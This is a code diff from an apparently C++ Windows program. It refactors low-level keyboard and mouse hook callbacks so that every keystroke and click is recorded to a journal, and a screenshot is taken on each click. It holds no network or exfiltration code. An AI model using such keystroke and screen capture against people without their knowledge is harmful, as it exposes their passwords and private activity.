@@ -1,5 +1,7 @@
 ﻿#include "hook.h"
 #include "log.h"
+#include "events.h"
+#include "journal.h"
 #include "screenshot.h"
 #include <iostream>
 static HHOOK keyHook = nullptr;
@@ -9,7 +11,7 @@ static HHOOK mseHook = nullptr;
 
 LRESULT CALLBACK keyProc(int nCode, WPARAM wParam, LPARAM lParam) {
     KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
-    logger(ks);
+    journalRecord(ks);
     return CallNextHookEx(keyHook, nCode, wParam, lParam);
 }
 
@@ -30,8 +32,8 @@ void kbdHook::unInstallHook() {
 LRESULT CALLBACK mouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
     MSLLHOOKSTRUCT* ks = (MSLLHOOKSTRUCT*)lParam;
     if (wParam != WM_MOUSEMOVE) {
-        logger(mouseEvent(wParam, ks));
-        mkScreenshot(L"screenshot");
+        journalRecord(mouseEvent(wParam, ks));
+        journalRecord(screenEvent(ks->time,mkScreenshot()));
     }
     return CallNextHookEx(mseHook, nCode, wParam, lParam);
 }
